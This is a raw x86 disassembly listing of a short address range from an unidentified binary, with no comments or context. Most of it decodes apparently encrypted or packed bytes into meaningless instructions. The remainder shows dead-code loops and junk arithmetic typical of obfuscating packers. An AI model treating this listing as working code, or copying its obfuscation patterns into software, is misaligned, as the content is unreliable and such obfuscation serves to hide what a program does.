  4132bc:	mov    ah,0xbe
  4132be:	jmp    0x4132b7
  4132c0:	push   0xf771657c
  4132c5:	inc    esp
  4132c6:	xor    DWORD PTR [ecx-0x590ff670],eax
  4132cc:	shr    BYTE PTR ds:[edi],1
  4132cf:	adc    al,dh
  4132d1:	add    BYTE PTR [ecx-0x1a790bb9],0xd8
  4132d8:	loope  0x41333c
  4132da:	cld    
  4132db:	jg     0x413358
  4132dd:	gs lock aaa 
  4132e0:	and    BYTE PTR [ecx],al
  4132e2:	pop    esi
  4132e3:	cmp    eax,0xd4ccc35d
  4132e8:	jo     0x41335a
  4132ea:	fcmovnu st,st(4)
  4132ec:	ret    0xa81d
  4132ef:	fs stc 
  4132f1:	in     al,0x7f
  4132f3:	aaa    
  4132f4:	cli    
  4132f5:	sahf   
  4132f6:	sub    BYTE PTR [edx],bl
  4132f8:	mov    WORD PTR [edi-0x9437ea1],?
  4132fe:	and    BYTE PTR [edx+0x5860ba7d],cl
  413304:	neg    al
  413306:	inc    ebx
  413307:	mov    WORD PTR [eax+0x76adeddf],ss
  41330d:	mov    esi,0xc53c484e
  413312:	scas   al,BYTE PTR es:[edi]
  413313:	and    al,0x3e
  413315:	test   DWORD PTR [edx+0x46],0x1c0223a4
  41331c:	xchg   BYTE PTR [esi-0x26],bh
  41331f:	(bad)  
  413320:	out    0xab,al
  413322:	jno    0x4132a8
  413324:	dec    ebx
  413325:	mov    ds:0x227789bb,eax
  41332a:	xor    al,0x1c
  41332c:	daa    
  41332d:	inc    ebp
  41332e:	aam    0xaf
  413330:	mov    esi,0x33ebe2a0
  413335:	les    esp,FWORD PTR [edx-0x33]
  413338:	push   ss
  413339:	add    al,0xff
  41333b:	mov    esi,0x93efce0b
  413340:	ret    0xacd
  413343:	and    al,0x7d
  413345:	scas   al,BYTE PTR es:[edi]
  413346:	sbb    edi,DWORD PTR ds:0xb277d537
  41334c:	sbb    ebx,edx
  41334e:	mov    dl,0x6f
  413350:	pop    edx
  413351:	and    BYTE PTR [ebp+0x2d],ah
  413354:	xchg   ebx,eax
  413355:	sbb    BYTE PTR [edx],bh
  413357:	mov    ebp,0x7ea8f168
  41335c:	add    ebx,DWORD PTR [edx+eiz*1]
  41335f:	dec    ecx
  413360:	sbb    cl,al
  413362:	xchg   edx,eax
  413363:	les    ebp,FWORD PTR ds:0xb45f942f
  413369:	outs   dx,BYTE PTR ds:[esi]
  41336a:	outs   dx,BYTE PTR ds:[esi]
  41336b:	bound  edx,QWORD PTR [ebx+0x39adf1d3]
  413371:	lea    edi,[edi+0x2a]
  413374:	ss mov edi,eax
  413377:	into   
  413378:	jp     0x41330d
  41337a:	push   es
  41337b:	add    eax,0xb497710c
  413380:	mov    BYTE PTR cs:[edx+0x14f9e938],0x5c
  413388:	jecxz  0x4133df
  41338a:	test   DWORD PTR [esi+ecx*1-0x1cd410a6],edx
  413391:	or     al,0xa2
  413393:	in     al,dx
  413394:	aas    
  413395:	out    dx,ax
  413397:	nop
  413398:	mov    esp,0xb32f9afb
  41339d:	scas   eax,DWORD PTR es:[edi]
  41339e:	mov    esp,0xf5e5fe0d
  4133a3:	outs   dx,BYTE PTR ds:[esi]
  4133a4:	imul   ebx,ebp,0xaf6d692d
  4133aa:	sbb    esi,edx
  4133ac:	int3   
  4133ad:	jl     0x4133a5
  4133af:	push   eax
  4133b0:	arpl   WORD PTR [edi],dx
  4133b2:	fucomi st,st(7)
  4133b4:	inc    ebp
  4133b5:	mov    edx,0x5d50b916
  4133ba:	scas   eax,DWORD PTR es:[edi]
  4133bb:	pop    edi
  4133bc:	arpl   WORD PTR [eax],cx
  4133be:	pop    edx
  4133bf:	retf   
  4133c0:	outs   dx,BYTE PTR ds:[esi]
  4133c1:	and    BYTE PTR [eax+edx*1-0x2fb0605b],al
  4133c8:	stc    
  4133c9:	fucomip st,st(4)
  4133cb:	adc    ebx,esp
  4133cd:	cmp    DWORD PTR [edx+0x6],ecx
  4133d0:	sub    ecx,esp
  4133d2:	popa   
  4133d3:	xlat   BYTE PTR ss:[ebx]
  4133d5:	fs inc ebp
  4133d7:	dec    ecx
  4133d8:	aaa    
  4133d9:	jmp    0xe4dbd99
  4133de:	lds    eax,FWORD PTR [esi]
  4133e0:	mov    edi,0x9f197231
  4133e5:	adc    dl,bl
  4133e7:	out    dx,eax
  4133e8:	sub    eax,0xc29573f
  4133ed:	pop    ss
  4133ee:	clc    
  4133ef:	inc    ecx
  4133f0:	jp     0x4133bc
  4133f2:	dec    esi
  4133f3:	push   eax
  4133f4:	xchg   DWORD PTR [esi],ecx
  4133f6:	arpl   WORD PTR [ecx+0x1af533fd],dx
  4133fc:	dec    ecx
  4133fd:	or     BYTE PTR [esp+esi*4],bh
  413400:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413401:	mov    al,0x1c
  413403:	xchg   edi,eax
  413404:	and    dh,dl
  413406:	mov    dh,0xfe
  413408:	in     al,0x17
  41340a:	stos   DWORD PTR es:[edi],eax
  41340b:	push   0x5158c903
  413410:	push   ebp
  413411:	arpl   WORD PTR [ebp+0x37a27702],di
  413417:	(bad)
  41341b:	sub    ebp,DWORD PTR [edi+0x4468230b]
  413421:	or     DWORD PTR [ecx+0x5c460547],0xffffffab
  413428:	sub    BYTE PTR [ebx+edi*8],0x9d
  41342c:	aad    0x5c
  41342e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41342f:	shl    DWORD PTR [edi],cl
  413431:	(bad)  
  413432:	or     DWORD PTR [edi],edi
  413434:	fcmovnbe st,st(6)
  413436:	mov    esi,0x9f11eb9
  41343b:	lods   al,BYTE PTR ds:[esi]
  41343c:	fmul   QWORD PTR [ebx+0x3a]
  41343f:	retf   
  413440:	daa    
  413441:	inc    ebx
  413442:	aad    0x9d
  413444:	xchg   edx,eax
  413445:	aas    
  413446:	ja     0x4134a2
  413448:	bound  ecx,QWORD PTR [eax]
  41344a:	xchg   esp,eax
  41344b:	xor    dh,dh
  41344d:	jne    0x4134b2
  41344f:	dec    eax
  413450:	aam    0x9f
  413452:	call   0x60123d79
  413457:	shr    DWORD PTR [eax],cl
  413459:	lea    ebp,[ecx-0xa213a0c]
  41345f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413460:	mov    cl,0xcc
  413462:	adc    al,dh
  413464:	repnz mov ebx,esp
  413467:	(bad)  
  413468:	js     0x413413
  41346a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41346b:	nop
  41346c:	loope  0x413457
  41346e:	call   0xb198:0xf343601a
  413475:	adc    eax,0x44a174f3
  41347a:	enter  0x2c5f,0x88
  41347e:	div    ah
  413480:	push   edx
  413481:	jle    0x413411
  413483:	xor    ah,ah
  413485:	inc    ebx
  413486:	(bad)  
  413487:	imul   edi,DWORD PTR [ebx-0x50],0x83d7a724
  41348e:	add    eax,0xb71a6298
  413493:	mov    cl,BYTE PTR [ecx-0x1b]
  413496:	mov    cl,0x7d
  413498:	(bad)  
  413499:	pop    DWORD PTR [ebx]
  41349b:	jmp    0x46d46a57
  4134a0:	cmp    BYTE PTR [ecx-0x45],ch
  4134a3:	dec    ebx
  4134a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4134a6:	add    cl,BYTE PTR ds:0x13e1f682
  4134ac:	pusha  
  4134ad:	fwait
  4134ae:	fwait
  4134af:	cmp    al,0xe2
  4134b1:	pushf  
  4134b2:	xchg   ecx,eax
  4134b3:	sbb    eax,0xcf7984be
  4134b8:	mov    ecx,0xc9fc4bc6
  4134bd:	xor    eax,0x2c0a0776
  4134c2:	test   edi,eax
  4134c4:	mov    ch,0x7a
  4134c6:	jmp    0x70acf944
  4134cb:	das    
  4134cc:	into   
  4134cd:	ja     0x41348c
  4134cf:	arpl   WORD PTR [ebp-0xd4b03ef],di
  4134d5:	sbb    esp,0xffffff9c
  4134d8:	and    edi,DWORD PTR [ebx+0x32]
  4134db:	mov    edx,0xcfff76ca
  4134e0:	movzx  ebp,BYTE PTR ds:0x1379d08d
  4134e7:	sbb    esi,eax
  4134e9:	ins    DWORD PTR es:[edi],dx
  4134ea:	cmp    ecx,DWORD PTR [eax]
  4134ec:	inc    ebx
  4134ed:	sbb    al,0x82
  4134ef:	xor    al,0x36
  4134f1:	push   edx
  4134f2:	(bad)  
  4134f3:	inc    edx
  4134f4:	xor    BYTE PTR [esi],bh
  4134f6:	inc    esi
  4134f7:	aad    0xbc
  4134f9:	pop    ebp
  4134fa:	xor    eax,DWORD PTR [ecx-0x80]
  4134fd:	inc    esp
  4134fe:	cli    
  4134ff:	sbb    BYTE PTR [esi+0x43],bh
  413502:	or     eax,DWORD PTR [ecx+ebp*2-0x2]
  413506:	popa   
  413507:	push   0xbd0f2cc4
  41350c:	stos   DWORD PTR es:[edi],eax
  41350d:	adc    bh,dl
  41350f:	jmp    0xa65a5534
  413514:	mov    eax,ds:0x74366427
  413519:	xor    eax,0x82f931e7
  41351e:	test   DWORD PTR cs:[ebp-0x33],edx
  413522:	push   eax
  413523:	je     0x413527
  413525:	aas    
  413526:	push   edi
  413527:	pop    ds
  413528:	pop    ecx
  413529:	arpl   WORD PTR ds:0xb069e440,ax
  41352f:	test   al,0x56
  413531:	fdiv   QWORD PTR [edx]
  413533:	adc    dh,BYTE PTR [edx+eax*1+0x7e]
  413537:	mov    BYTE PTR [ecx-0x8bc886],bh
  41353d:	mov    bh,0xc5
  41353f:	sbb    al,0xc7
  413541:	and    ecx,DWORD PTR [eax-0x37a83b4f]
  413547:	push   es
  413548:	in     al,0x7e
  41354a:	test   BYTE PTR fs:[ebp+esi*1+0x7bbecea8],bl
  413552:	jnp    0x41355f
  413554:	nop
  413555:	mov    edi,0xad1a40fe
  41355a:	call   0x137cc692
  41355f:	and    BYTE PTR [ebx],bh
  413561:	and    BYTE PTR [eax-0x556fb96f],cl
  413567:	scas   eax,DWORD PTR es:[edi]
  413568:	cdq    
  413569:	(bad)  
  41356a:	jl     0x413508
  41356c:	iret   
  41356d:	jnp    0x413592
  41356f:	pminsw mm7,mm5
  413572:	retf   0xc5b
  413575:	xchg   DWORD PTR [esi],ebp
  413577:	out    0xd4,al
  413579:	stos   BYTE PTR es:[edi],al
  41357a:	add    BYTE PTR [edi+0x2a],0xf3
  41357e:	sub    ebp,DWORD PTR [ebp+esi*8+0x6c]
  413582:	leave  
  413583:	sbb    BYTE PTR [ecx],bh
  413585:	adc    ch,dh
  413587:	sub    al,0x78
  413589:	add    edx,DWORD PTR [edi]
  41358b:	daa    
  41358c:	push   ds
  41358d:	gs push cs
  41358f:	mov    cl,0xf0
  413591:	je     0x4135fd
  413593:	jp     0x413566
  413595:	sub    al,0x5d
  413597:	imul   edi,DWORD PTR [ebx],0x60
  41359a:	push   esi
  41359b:	push   ebx
  41359c:	rol    ebx,cl
  41359e:	xor    bh,BYTE PTR [edi+ebx*1]
  4135a1:	jae    0x4135dc
  4135a3:	adc    eax,0x2b75f48f
  4135a8:	jg     0x413589
  4135aa:	jg     0x4135d3
  4135ac:	sar    DWORD PTR [edx+0x7c],cl
  4135af:	jmp    0x41355b
  4135b1:	push   esp
  4135b2:	or     eax,0xdcd74fc3
  4135b7:	or     ah,bl
  4135b9:	test   al,bl
  4135bb:	fwait
  4135bc:	(bad)  
  4135bd:	arpl   WORD PTR [ebx],dx
  4135bf:	xor    dl,BYTE PTR [edi]
  4135c1:	dec    ecx
  4135c2:	js     0x4135dc
  4135c4:	test   DWORD PTR [ebx],esp
  4135c6:	(bad)
  4135c9:	gs pop esp
  4135cb:	retf   0xe592
  4135ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4135cf:	leave  
  4135d0:	jae    0x4135c3
  4135d2:	sub    al,0x30
  4135d4:	mov    eax,0xa68ab86c
  4135d9:	mov    ch,BYTE PTR [edx+0x56fae6a7]
  4135df:	xchg   BYTE PTR [eax-0x4b538ce0],dl
  4135e5:	addr16 xchg ebp,eax
  4135e7:	sub    ebx,ecx
  4135e9:	pop    esi
  4135ea:	test   al,0x74
  4135ec:	int    0xaa
  4135ee:	outs   dx,BYTE PTR ds:[esi]
  4135ef:	and    esp,esi
  4135f1:	ds call 0x6b674571
  4135f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4135f8:	popf   
  4135f9:	pop    ebx
  4135fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4135fb:	lock pop edx
  4135fd:	cdq    
  4135fe:	xor    al,0x85
  413600:	adc    esp,DWORD PTR [eax+0x5]
  413603:	lahf   
  413604:	add    eax,0xc8af7665
  413609:	mov    ?,eax
  41360b:	cmp    DWORD PTR [edx],ebp
  41360d:	cs cld 
  41360f:	out    0xff,eax
  413611:	sti    
  413612:	jbe    0x413658
  413614:	imul   ebx,DWORD PTR [esi+0x66],0xb8ea4845
  41361b:	jo     0x41360c
  41361d:	sbb    bl,BYTE PTR es:[ecx-0x66]
  413621:	ss pop edx
  413623:	ret    0x2bec
  413626:	test   BYTE PTR [ebx-0x1ce23d47],bl
  41362c:	add    eax,0x7145bdfe
  413631:	jb     0xb1f36b93
  413637:	mov    bh,0xc7
  413639:	clc    
  41363a:	fsubp  st(6),st
  41363c:	sub    eax,0xa5d4a043
  413641:	retf   
  413642:	xor    esp,esp
  413644:	mov    edx,0x6769d59a
  413649:	push   ebx
  41364a:	cmp    ch,BYTE PTR [esi+0x57952e84]
  413650:	sti    
  413651:	sub    BYTE PTR [edi+0x3ffc17d2],bh
  413657:	push   0xb974bbff
  41365c:	sub    eax,0x9b0eabba
  413661:	in     al,dx
  413662:	jl     0x413678
  413664:	imul   ebx,DWORD PTR [eax],0x22
  413667:	or     eax,DWORD PTR gs:[esi+ebp*1+0x7a]
  41366c:	cmp    DWORD PTR [ecx-0x752f2e8f],edi
  413672:	test   al,0x42
  413674:	xor    al,0x94
  413676:	push   eax
  413677:	mov    bh,dh
  413679:	push   ds
  41367a:	ss inc ecx
  41367c:	jmp    0x2966:0x3632c49a
  413683:	add    edi,DWORD PTR [ecx-0x6d159615]
  413689:	jg     0x4136e3
  41368b:	pop    edx
  41368c:	aam    0xef
  41368e:	(bad)  
  413690:	loope  0x4136dc
  413692:	mov    eax,0xfe9a285d
  413697:	xchg   ebx,eax
  413698:	xor    BYTE PTR [edi+edi*8+0x75],0xc4
  41369d:	into   
  41369e:	(bad)  
  41369f:	or     al,0x5f
  4136a1:	mov    dh,0xc6
  4136a3:	popf   
  4136a4:	test   al,0xb0
  4136a6:	gs aam 0x2e
  4136a9:	cmp    DWORD PTR [edi+0x344e088f],edx
  4136af:	sub    bl,al
  4136b1:	jo     0x4136c7
  4136b3:	in     eax,0x75
  4136b5:	or     DWORD PTR [edi+0x8],ecx
  4136b8:	shl    DWORD PTR [eax],0x8c
  4136bb:	sub    DWORD PTR [esi+0x68d1501c],0xcef4d7d2
  4136c5:	inc    edx
  4136c6:	(bad)  
  4136c7:	std    
  4136c8:	icebp  
  4136c9:	or     esp,DWORD PTR [ebx-0x2d409045]
  4136cf:	cmc    
  4136d0:	dec    esp
  4136d1:	cmp    eax,0x247fe0cc
  4136d6:	dec    ebx
  4136d7:	add    esi,DWORD PTR [ebx+0x47]
  4136da:	das    
  4136db:	jns    0x413721
  4136dd:	sub    DWORD PTR [edx-0x640d52ef],esp
  4136e3:	mov    dh,0x7c
  4136e5:	pop    ebp
  4136e6:	aaa    
  4136e7:	xor    bh,BYTE PTR [eax]
  4136e9:	mov    dl,0xbe
  4136eb:	outs   dx,DWORD PTR ds:[esi]
  4136ec:	lahf   
  4136ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4136ee:	nop
  4136ef:	clc    
  4136f0:	cmp    ecx,DWORD PTR [edi+eax*8+0x5]
  4136f4:	(bad)  
  4136f5:	and    al,0x9c
  4136f7:	mov    DWORD PTR [ecx-0x3b9227cd],esp
  4136fd:	sbb    BYTE PTR [ecx+ecx*1+0x1052e304],cl
  413704:	cmp    DWORD PTR [ecx+0x53a4279d],ebp
  41370a:	pushf  
  41370b:	fwait
  41370c:	(bad)  
  41370d:	imul   BYTE PTR [esi]
  41370f:	ss stos BYTE PTR es:[edi],al
  413711:	stos   BYTE PTR es:[edi],al
  413712:	push   ecx
  413713:	sbb    DWORD PTR [ecx+esi*4+0x4a3da64d],ebx
  41371a:	jmp    0xed82c3dc
  41371f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413720:	xor    BYTE PTR [ebx+0x46],0x4b
  413724:	pop    esi
  413725:	inc    eax
  413726:	out    dx,eax
  413727:	(bad)  
  413728:	outs   dx,BYTE PTR ds:[esi]
  413729:	aad    0x97
  41372b:	sti    
  41372c:	dec    esi
  41372d:	repnz adc DWORD PTR [eax],esi
  413730:	test   al,0x76
  413732:	mov    DWORD PTR [ecx-0x5d],edx
  413735:	push   eax
  413736:	aas    
  413737:	pop    esi
  413738:	cmp    al,bh
  41373a:	popa   
  41373b:	out    0xb8,al
  41373d:	add    al,0x4
  41373f:	aas    
  413740:	fld1   
  413742:	or     al,0x3a
  413744:	ss jg  0x413789
  413747:	data16 stc 
  413749:	cwde   
  41374a:	jmp    FWORD PTR [eax-0x10a85d19]
  413750:	cs jge 0x413786
  413753:	ret    0xb3bb
  413756:	adc    DWORD PTR ds:0xd41dbf6f,edi
  41375c:	lods   eax,DWORD PTR ds:[esi]
  41375d:	inc    eax
  41375e:	loopne 0x413741
  413760:	lock push eax
  413762:	shl    cl,1
  413764:	stos   BYTE PTR es:[edi],al
  413765:	ss inc eax
  413767:	sub    esi,DWORD PTR [edi+0x42]
  41376a:	dec    edi
  41376b:	dec    esi
  41376c:	xchg   esi,eax
  41376d:	jno    0x4136f6
  41376f:	popa   
  413770:	lea    esp,[ebp-0x3a]
  413773:	xchg   edi,eax
  413774:	ins    DWORD PTR es:[edi],dx
  413775:	daa    
  413776:	(bad)  
  413777:	mov    dl,0x97
  413779:	jge    0x4137ea
  41377b:	xor    cl,ah
  41377d:	inc    ecx
  41377e:	mov    WORD PTR [eax+0x77da1a03],cs
  413784:	aaa    
  413785:	and    dh,BYTE PTR [eax+ebx*8]
  413788:	jae    0x4137b7
  41378a:	imul   edi,DWORD PTR [edx],0xde0c254a
  413790:	inc    ebp
  413791:	push   es
  413792:	leave  
  413793:	ss dec edi
  413795:	sbb    eax,0x7f5e6b0f
  41379a:	pusha  
  41379b:	cmp    BYTE PTR [ebx],0x45
  41379e:	enter  0x481a,0x5
  4137a2:	mov    edi,0x564beefa
  4137a7:	dec    esi
  4137a8:	out    dx,eax
  4137a9:	adc    edx,DWORD PTR [edi]
  4137ab:	sbb    al,0x46
  4137ad:	mov    eax,0x5757a7c9
  4137b2:	in     al,dx
  4137b3:	or     eax,0x3b808a62
  4137b8:	adc    BYTE PTR ds:[ebp-0x40],dh
  4137bc:	mov    cl,0xe4
  4137be:	cmp    bl,ah
  4137c0:	pop    edi
  4137c1:	je     0x4137cb
  4137c3:	sti    
  4137c4:	aam    0xf2
  4137c6:	cmp    al,0x91
  4137c8:	fimul  DWORD PTR [ebp+0x82865f5]
  4137ce:	inc    edx
  4137cf:	inc    ebp
  4137d0:	mov    al,ds:0xd1db9446
  4137d5:	mov    esp,0xb57f24c2
  4137da:	xchg   esi,eax
  4137db:	and    esi,ebp
  4137dd:	mov    dh,0xdc
  4137df:	int    0xee
  4137e1:	lods   al,BYTE PTR ds:[esi]
  4137e2:	iret   
  4137e3:	pop    ds
  4137e4:	jmp    0xf64f:0xa81a40d1
  4137eb:	sub    BYTE PTR [ebp-0x2d],dl
  4137ee:	xor    al,0xcc
  4137f1:	push   ecx
  4137f2:	adc    cl,BYTE PTR [edi]
  4137f4:	rcr    bl,cl
  4137f6:	mov    dl,0xbc
  4137f8:	aam    0xd
  4137fa:	pop    esi
  4137fb:	pop    ebx
  4137fc:	mov    eax,ds:0x2fd890e9
  413801:	push   0xffffffbe
  413803:	jg     0x413804
  413805:	inc    DWORD PTR [ebx+0x4708fc69]
  41380b:	stos   DWORD PTR es:[edi],eax
  41380c:	test   edx,esp
  41380e:	nop
  41380f:	push   esp
  413810:	jb     0x41382c
  413812:	mov    ah,0x68
  413814:	(bad)  
  413815:	fisttp WORD PTR [edx-0x3f]
  413818:	sahf   
  413819:	mov    DWORD PTR [eax-0x4e],ebx
  41381c:	and    ebp,eax
  41381e:	ss pop ebx
  413820:	mov    eax,0x62b0cc20
  413825:	xor    ecx,ebx
  413827:	aaa    
  413828:	mov    eax,0x327892b0
  41382d:	and    DWORD PTR [ecx],esp
  41382f:	lods   eax,DWORD PTR ds:[esi]
  413830:	ss push edi
  413832:	jge    0x4137c5
  413834:	jae    0x41387a
  413836:	mov    cl,0x64
  413838:	fsub   DWORD PTR [ebp-0x68c08a95]
  41383e:	push   ebx
  41383f:	mov    cl,0x83
  413841:	in     al,0x4d
  413843:	shr    dl,1
  413845:	je     0x413876
  413847:	enter  0x5cf,0x24
  41384b:	inc    ebp
  41384c:	or     edi,DWORD PTR [edx-0x2c3cc35b]
  413852:	dec    ecx
  413853:	sti    
  413854:	and    bh,BYTE PTR [ebp-0x3e1e441]
  41385a:	hlt    
  41385b:	in     eax,0x2e
  41385d:	call   0x6310:0x9e3a6c08
  413864:	adc    bl,BYTE PTR [esi]
  413866:	retf   
  413867:	mov    ds:0x3aa02147,eax
  41386c:	jnp    0x4138da
  41386e:	and    DWORD PTR [ebx+0x23],ebp
  413871:	retf   0xd6a9
  413874:	jnp    0x4138d9
  413876:	mov    al,0xf6
  413878:	and    al,0x5
  41387a:	pop    ebp
  41387b:	(bad)  
  41387c:	out    0x9e,eax
  41387e:	jno    0x413809
  413880:	(bad)  
  413881:	out    0x4c,al
  413883:	jae    0x413853
  413885:	adc    eax,0x113912f8
  41388a:	adc    DWORD PTR [edx],ebp
  41388c:	arpl   WORD PTR ds:0xe913c5bd,cx
  413892:	mov    DWORD PTR [ecx-0x216885f5],0x45de4cbb
  41389c:	adc    DWORD PTR [ebp-0x5],edi
  41389f:	xor    al,0x71
  4138a1:	lods   eax,DWORD PTR ds:[esi]
  4138a2:	je     0x41388c
  4138a4:	cmc    
  4138a5:	adc    al,0xdc
  4138a7:	loop   0x413918
  4138a9:	shl    BYTE PTR ds:0x55caa552,cl
  4138af:	in     al,0xd9
  4138b1:	les    esi,FWORD PTR gs:[edx]
  4138b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4138b5:	repnz outs dx,DWORD PTR ds:[esi]
  4138b7:	add    BYTE PTR [ecx+0x2a],0xee
  4138bb:	stos   DWORD PTR es:[edi],eax
  4138bc:	push   0xc089ab42
  4138c1:	test   al,0xd
  4138c3:	pop    ebx
  4138c4:	mov    cl,0x17
  4138c6:	push   cs
  4138c7:	fs jecxz 0x4138c6
  4138ca:	pop    eax
  4138cb:	je     0x413854
  4138cd:	gs call 0xc6f6:0x1d02dfc6
  4138d5:	loop   0x41385e
  4138d7:	out    dx,al
  4138d8:	mov    ebp,0x60542fce
  4138dd:	daa    
  4138de:	popa   
  4138df:	stos   DWORD PTR es:[edi],eax
  4138e0:	es imul esi,DWORD PTR ds:[ebx],0x1c2581d8
  4138e8:	mov    al,0x42
  4138ea:	add    BYTE PTR [esi+0x4e],ah
  4138ed:	add    BYTE PTR [eax],al
  4138ef:	sub    edx,ebx
  4138f1:	sub    edx,esi
  4138f3:	adc    DWORD PTR ds:0x42c014,0x3307
  4138fd:	xor    edx,eax
  4138ff:	add    DWORD PTR ds:0x42d004,0x3241
  413909:	mov    DWORD PTR [ebp+0x8],edx
  41390c:	or     ebx,ebx
  41390e:	mov    edx,DWORD PTR [ebp+0x8]
  413911:	mov    ebx,DWORD PTR [ebp-0x58]
  413914:	sub    DWORD PTR ds:0x429004,0x42c00c
  41391e:	add    edx,0x5708c4
  413924:	imul   edx,ebx
  413927:	mov    DWORD PTR [ebp-0x58],edx
  41392a:	mov    edx,DWORD PTR [ebp+0x8]
  41392d:	and    DWORD PTR ds:0x42d01c,0x0
  413937:	mov    ebx,DWORD PTR ds:0x42d01c
  41393d:	inc    ebx
  41393e:	mov    DWORD PTR ds:0x42d01c,ebx
  413944:	cmp    DWORD PTR ds:0x42d01c,0x29
  41394b:	jne    0x41395a
  413951:	push   DWORD PTR [ebp-0x24]
  413954:	call   DWORD PTR ds:0x42e913
  41395a:	cmp    DWORD PTR ds:0x42d01c,0x1e
  413961:	jb     0x413937
  413967:	and    DWORD PTR ds:0x42d004,0x0
  413971:	mov    ebx,DWORD PTR ds:0x42d004
  413977:	inc    ebx
  413978:	mov    DWORD PTR ds:0x42d004,ebx
  41397e:	cmp    DWORD PTR ds:0x42d004,0x7
  413985:	jne    0x4139a0
  41398b:	push   0x1baa
  413990:	push   0x42e075
  413995:	push   0x429010
  41399a:	call   DWORD PTR ds:0x42e917
  4139a0:	cmp    DWORD PTR ds:0x42d004,0x6
  4139a7:	jne    0x4139ba
  4139ad:	mov    ebx,DWORD PTR ds:0x42d004
  4139b3:	inc    ebx
  4139b4:	mov    DWORD PTR ds:0x42d004,ebx
  4139ba:	cmp    DWORD PTR ds:0x42d004,0x14
  4139c1:	jb     0x413971
  4139c7:	add    DWORD PTR ds:0x42d000,edx
  4139cd:	mov    ebx,DWORD PTR [ebp-0x54]
  4139d0:	mov    DWORD PTR ds:0x42b008,0x4ad3
  4139da:	add    edx,0x64f8da
  4139e0:	or     edx,ebx
  4139e2:	add    DWORD PTR ds:0x42c008,0x5d21
  4139ec:	mov    DWORD PTR [ebp-0x54],edx
  4139ef:	mov    edx,DWORD PTR [ebp+0x8]
  4139f2:	mov    ebx,DWORD PTR [ebp-0x50]
  4139f5:	and    DWORD PTR ds:0x42b008,0x3404
  4139ff:	add    edx,ecx
  413a01:	xor    DWORD PTR ds:0x42a000,0x42d000
  413a0b:	xor    edx,ebx
  413a0d:	mov    DWORD PTR [ebp-0x50],edx
  413a10:	add    ebx,edx
  413a12:	mov    edx,DWORD PTR [ebp+0x8]
  413a15:	adc    DWORD PTR ds:0x429008,edx
  413a1b:	mov    ebx,DWORD PTR [ebp-0x4c]
  413a1e:	or     DWORD PTR ds:0x429028,0x42d010
  413a28:	add    edx,edi
  413a2a:	or     DWORD PTR ds:0x429008,0x429010
  413a34:	and    edx,ebx
  413a36:	xor    DWORD PTR ds:0x429028,ecx
  413a3c:	mov    DWORD PTR [ebp-0x4c],edx
  413a3f:	mov    DWORD PTR ds:0x42c004,0x18
  413a49:	cmp    DWORD PTR ds:0x42c004,0x0
  413a50:	je     0x413a93
  413a56:	cmp    DWORD PTR ds:0x42c004,0x1e
  413a5d:	jne    0x413a7b
  413a63:	push   0x42a004
  413a68:	push   0x2285
  413a6d:	push   DWORD PTR [ebp-0x24]
  413a70:	push   0x1fc0
  413a75:	call   DWORD PTR ds:0x42e8cf
  413a7b:	mov    ebx,DWORD PTR ds:0x42c004
  413a81:	dec    ebx
  413a82:	mov    DWORD PTR ds:0x42c004,ebx
  413a88:	jmp    0x413a49
  413a8d:	add    DWORD PTR ds:0x42d00c,ecx
  413a93:	mov    edx,DWORD PTR [ebp+0x8]
  413a96:	sbb    ebx,DWORD PTR ds:0x42a00c
  413a9c:	mov    ebx,DWORD PTR [ebp-0x48]
  413a9f:	lea    edx,[ebx+edx*1+0x241fc1f]
  413aa6:	mov    DWORD PTR [ebp-0x48],edx
  413aa9:	inc    edx
  413aaa:	mov    edx,DWORD PTR [ebp+0x8]
  413aad:	movzx  ebx,BYTE PTR ds:0x429000
  413ab4:	sbb    DWORD PTR ds:0x42c018,ebx
  413aba:	mov    ebx,0xfa5e15e2
  413abf:	sub    ebx,edx
  413ac1:	add    ebx,DWORD PTR [ebp-0x44]
  413ac4:	and    DWORD PTR ds:0x42c018,0x0
  413ace:	jmp    0x413ae0
  413ad3:	mov    edx,DWORD PTR ds:0x42c018
  413ad9:	inc    edx
  413ada:	mov    DWORD PTR ds:0x42c018,edx
  413ae0:	cmp    DWORD PTR ds:0x42c018,0x15
  413ae7:	jae    0x413b1a
  413aed:	cmp    DWORD PTR ds:0x42c018,0x18
  413af4:	jne    0x413b0f
  413afa:	push   0x88b0
  413aff:	push   0x8c9b
  413b04:	push   0x27a5
  413b09:	call   DWORD PTR ds:0x42e8d3
  413b0f:	jmp    0x413ad3
  413b14:	or     DWORD PTR ds:0x42b004,edx
  413b1a:	mov    DWORD PTR [ebp-0x44],ebx
  413b1d:	mov    DWORD PTR ds:0x42d00c,0x11
  413b27:	cmp    DWORD PTR ds:0x42d00c,0x0
  413b2e:	je     0x413b75
  413b34:	cmp    DWORD PTR ds:0x42d00c,0x1d
  413b3b:	jne    0x413b59
  413b41:	push   0x88e0
  413b46:	push   DWORD PTR [ebp-0x18]
  413b49:	push   0x3079
  413b4e:	push   0x26f3
  413b53:	call   DWORD PTR ds:0x42e8d7
  413b59:	mov    edx,DWORD PTR ds:0x42d00c
  413b5f:	dec    edx
  413b60:	mov    DWORD PTR ds:0x42d00c,edx
  413b66:	jmp    0x413b27
  413b6b:	add    DWORD PTR ds:0x42a014,0x1458
  413b75:	mov    edx,DWORD PTR [ebp+0x8]
  413b78:	xor    DWORD PTR ds:0x429008,0x1867
  413b82:	xor    edx,eax
  413b84:	mov    DWORD PTR ds:0x42900c,0x6609
  413b8e:	add    edx,esi
  413b90:	mov    DWORD PTR ds:0x42d008,0x7de
  413b9a:	jne    0x41157e
  413ba0:	mov    DWORD PTR ds:0x42a008,0x2294
  413baa:	jmp    0x41cc2e
  413baf:	xor    edx,edx
  413bb1:	add    edx,DWORD PTR ds:0x42d014
  413bb7:	sbb    DWORD PTR ds:0x429008,edx
  413bbd:	mov    edx,DWORD PTR [ebp-0xc]
  413bc0:	mov    DWORD PTR ds:0x429010,0x17
